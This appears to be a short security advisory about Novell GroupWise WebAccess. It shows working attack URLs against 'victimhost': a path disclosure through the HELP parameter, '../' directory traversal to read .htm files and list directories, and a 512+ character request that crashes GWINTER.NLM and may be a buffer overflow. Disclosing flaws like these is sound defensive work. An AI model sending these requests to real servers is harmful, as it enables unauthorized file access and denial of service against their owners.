The HELP function in GWWEB.EXE will reveal the path of the server, and combined with the '../' string, allow read access for any client to any .htm file on the server, as well as browseable directory listings.

Also, it is possible to abend GWINTER.NLM by specifying a long string where the server expects a variable setting.

Requesting the following URL from the GroupWise server
http ://victimhost/cgi-bin/GW5/GWWEB.EXE?HELP=asdf
will return the error message:
Could not read file SYS:WEB\CGI-BIN\GW5\US\HTML3\HELP\ASDF.HTM
revealing the full path of the GroupWise server software.
Note: The URL above may need to be tailored to the target system.

To read .htm files anywhere on the server, or to browse directories, use HELP and the ../ string to traverse directories, for example:
http ://victimhost/cgi-bin/GW5/GWWEB.EXE?HELP=../../../secret.htm
or
http ://victimhost/cgi-bin/GW5/GWWEB.EXE?HELP=../../../
Again, the paths shown above may need to be modified.

To abend GWINTER.NLM request a URL like:
http ://victimhost/cgi-bin/GW5/GWWEB.EXE?[512+ chars]
It may be possible to remotely execute arbitrary code via this buffer overflow.
